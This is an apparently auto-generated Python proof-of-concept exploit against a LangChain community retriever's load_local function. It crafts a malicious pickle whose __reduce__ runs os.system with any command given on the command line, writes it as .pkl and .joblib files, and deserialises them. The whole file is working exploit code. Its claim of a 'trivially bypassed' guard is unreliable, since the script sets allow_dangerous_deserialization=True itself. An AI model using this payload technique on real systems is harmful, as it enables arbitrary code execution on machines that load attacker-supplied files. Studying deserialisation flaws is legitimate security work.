#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-017
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_10.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The load_local function uses joblib.load and pickle.load on files
constructed from user-controlled folder_path and file_name parameters. Although
there is a guard (allow_dangerous_deserialization) that must be set to True,
this guard is trivially bypassed by the caller. An attacker who can control
folder_path and file_name can load arbitrary pickle/joblib files, leading to RCE.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Calling load_local with attacker-controlled folder_path and file_name
3. Showing that the command executes, proving RCE

Usage:
    python poc.py [--target /path/to/target/dir]
"""

import os
import sys
import pickle
import tempfile
import argparse
import subprocess
from pathlib import Path

# Add the langchain-community-only path to sys.path
sys.path.insert(0, '/tmp/langchain-community-only')


def create_malicious_pickle(command: str) -> bytes:
    """
    Create a malicious pickle payload that executes a system command.
    
    This uses the standard pickle __reduce__ method to execute arbitrary code
    when the pickle is deserialized.
    """
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    return pickle.dumps(MaliciousPayload())


def create_malicious_joblib(command: str) -> bytes:
    """
    Create a malicious joblib payload that executes a system command.
    
    joblib uses pickle internally, so the same technique works.
    """
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    # joblib uses pickle with some compression, but for simplicity we'll
    # just use pickle format since joblib.load can read pickle files
    return pickle.dumps(MaliciousPayload())


def main():
    parser = argparse.ArgumentParser(
        description='PoC for RCE in langchain-community-only load_local'
    )
    parser.add_argument(
        '--target',
        default='/tmp/poc_target',
        help='Directory to use for the malicious files (default: /tmp/poc_target)'
    )
    parser.add_argument(
        '--command',
        default='touch /tmp/poc_success.txt',
        help='Command to execute (default: touch /tmp/poc_success.txt)'
    )
    args = parser.parse_args()

    # Create target directory
    target_dir = Path(args.target)
    target_dir.mkdir(parents=True, exist_ok=True)
    
    # Create malicious files
    print(f"[*] Creating malicious files in {target_dir}")
    
    # Create malicious .pkl file
    malicious_pkl = create_malicious_pickle(args.command)
    pkl_path = target_dir / "exploit.pkl"
    with open(pkl_path, 'wb') as f:
        f.write(malicious_pkl)
    print(f"[+] Created malicious pickle file: {pkl_path}")
    
    # Create malicious .joblib file (same content for simplicity)
    malicious_joblib = create_malicious_joblib(args.command)
    joblib_path = target_dir / "exploit.joblib"
    with open(joblib_path, 'wb') as f:
        f.write(malicious_joblib)
    print(f"[+] Created malicious joblib file: {joblib_path}")
    
    # Now call the vulnerable function
    print(f"\n[*] Attempting to trigger RCE via load_local...")
    print(f"[*] Command to execute: {args.command}")
    
    try:
        from langchain_community.retrievers.tfidf import TFIDFRetriever
        
        # This will trigger the deserialization of our malicious files
        # The allow_dangerous_deserialization flag is set to True (bypassed guard)
        result = TFIDFRetriever.load_local(
            folder_path=str(target_dir),
            file_name="exploit",
            allow_dangerous_deserialization=True
        )
        print(f"[!] load_local returned: {result}")
        
    except Exception as e:
        print(f"[!] Exception during load_local: {e}")
        # The exception might occur after the command has already executed
        # because the deserialization happens before the function returns
    
    # Check if the command was executed
    if args.command == 'touch /tmp/poc_success.txt':
        if os.path.exists('/tmp/poc_success.txt'):
            print("\n[+] SUCCESS: Command executed! File /tmp/poc_success.txt was created.")
            print("[+] This proves RCE is possible via the load_local function.")
            # Clean up
            os.remove('/tmp/poc_success.txt')
        else:
            print("\n[-] Command did not execute. The vulnerability might not be exploitable in this context.")
    else:
        print(f"\n[*] Check if your command '{args.command}' was executed.")
    
    # Clean up target directory
    print(f"\n[*] Cleaning up {target_dir}")
    for f in target_dir.iterdir():
        f.unlink()
    target_dir.rmdir()


if __name__ == '__main__':
    main()
